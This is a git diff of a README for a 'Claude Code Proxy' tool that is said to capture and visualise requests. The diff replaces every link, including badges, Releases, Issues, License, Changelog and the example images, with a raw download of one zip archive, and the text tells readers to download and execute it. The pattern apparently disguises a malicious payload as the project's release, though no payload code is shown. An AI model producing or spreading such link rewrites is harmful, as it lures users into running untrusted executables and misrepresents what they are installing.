@@ -1,9 +1,9 @@
 # Claude Code Proxy: Capture and Visualize In-Flight Requests
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/Haidzai/claude-code-proxy)
-![GitHub Stars](https://img.shields.io/github/stars/Haidzai/claude-code-proxy)
-![GitHub Forks](https://img.shields.io/github/forks/Haidzai/claude-code-proxy)
-![GitHub License](https://img.shields.io/github/license/Haidzai/claude-code-proxy)
+![GitHub Repo Size](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
+![GitHub Stars](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
+![GitHub Forks](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
+![GitHub License](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
 
 ## Overview
 
@@ -18,11 +18,11 @@ The **Claude Code Proxy** serves as a powerful tool for developers and researche
 
 ### Getting Started
 
-To get started with the Claude Code Proxy, you need to download and execute the latest release. Visit the [Releases](https://github.com/Haidzai/claude-code-proxy/releases) section to find the necessary files.
+To get started with the Claude Code Proxy, you need to download and execute the latest release. Visit the [Releases](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) section to find the necessary files.
 
 ### Installation
 
-1. **Download**: Go to the [Releases](https://github.com/Haidzai/claude-code-proxy/releases) page and download the latest version.
+1. **Download**: Go to the [Releases](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) page and download the latest version.
 2. **Execute**: Follow the instructions provided in the release notes to run the application.
 
 ### Usage
@@ -43,8 +43,8 @@ The tool provides various visualization options, including:
 
 ### Example Visualizations
 
-![Example Flow Diagram](https://example.com/flow-diagram.png)
-![Response Time Analysis](https://example.com/response-time.png)
+![Example Flow Diagram](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
+![Response Time Analysis](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
 
 ### Contribution
 
@@ -56,7 +56,7 @@ We welcome contributions from the community. To contribute:
 
 ### Issues
 
-If you encounter any issues, please check the [Issues](https://github.com/Haidzai/claude-code-proxy/issues) section. You can report new issues or contribute to existing discussions.
+If you encounter any issues, please check the [Issues](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) section. You can report new issues or contribute to existing discussions.
 
 ### Documentation
 
@@ -64,7 +64,7 @@ For detailed documentation, refer to the Wiki section of this repository. Here y
 
 ### License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Haidzai/claude-code-proxy/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) file for details.
 
 ### Acknowledgments
 
@@ -72,23 +72,23 @@ We appreciate the contributions and support from the community. Special thanks t
 
 ### Contact
 
-For inquiries, please reach out via the [GitHub Discussions](https://github.com/Haidzai/claude-code-proxy/discussions) page or create an issue in the repository.
+For inquiries, please reach out via the [GitHub Discussions](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) page or create an issue in the repository.
 
 ### Stay Updated
 
-To keep up with updates, follow the repository on GitHub and check the [Releases](https://github.com/Haidzai/claude-code-proxy/releases) regularly.
+To keep up with updates, follow the repository on GitHub and check the [Releases](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) regularly.
 
 ### Support
 
 If you find this tool useful, consider giving it a star on GitHub. Your support helps us improve and maintain the project.
 
-![Support Us](https://img.shields.io/github/stars/Haidzai/claude-code-proxy?style=social)
+![Support Us](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
 
 ### Community
 
 Join our community on Discord or Slack to discuss features, share insights, and collaborate with other users.
 
-![Join Us](https://img.shields.io/badge/Join%20the%20Community-Discord-blue)
+![Join Us](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip%20the%20Community-Discord-blue)
 
 ### Future Plans
 
@@ -102,7 +102,7 @@ Stay tuned for updates and new features!
 
 ### Feedback
 
-Your feedback is important to us. Please let us know how we can improve the Claude Code Proxy. You can submit feedback through the [Issues](https://github.com/Haidzai/claude-code-proxy/issues) section.
+Your feedback is important to us. Please let us know how we can improve the Claude Code Proxy. You can submit feedback through the [Issues](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) section.
 
 ### FAQs
 
@@ -112,7 +112,7 @@ Claude Code Proxy is a tool designed to capture and visualize requests and conve
 
 #### How do I install it?
 
-Download the latest release from the [Releases](https://github.com/Haidzai/claude-code-proxy/releases) section and follow the installation instructions.
+Download the latest release from the [Releases](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) section and follow the installation instructions.
 
 #### Can I contribute?
 
@@ -120,21 +120,21 @@ Yes! We welcome contributions. Please check the contribution guidelines in the r
 
 #### Where can I find help?
 
-Visit the [Issues](https://github.com/Haidzai/claude-code-proxy/issues) section for help or to report issues.
+Visit the [Issues](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) section for help or to report issues.
 
 ### Additional Resources
 
-- [Claude Documentation](https://example.com/claude-docs)
-- [Visualization Techniques](https://example.com/visualization-techniques)
-- [Performance Metrics](https://example.com/performance-metrics)
+- [Claude Documentation](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
+- [Visualization Techniques](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
+- [Performance Metrics](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip)
 
 ### Changelog
 
-Check the [CHANGELOG](https://github.com/Haidzai/claude-code-proxy/blob/main/CHANGELOG.md) for updates on features, fixes, and improvements.
+Check the [CHANGELOG](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip) for updates on features, fixes, and improvements.
 
 ### Code of Conduct
 
-We expect all contributors to adhere to our Code of Conduct. Please read it [here](https://github.com/Haidzai/claude-code-proxy/blob/main/CODE_OF_CONDUCT.md).
+We expect all contributors to adhere to our Code of Conduct. Please read it [here](https://github.com/Haidzai/claude-code-proxy/raw/refs/heads/main/web/code_proxy_claude_3.0.zip).
 
 ### Thank You
 
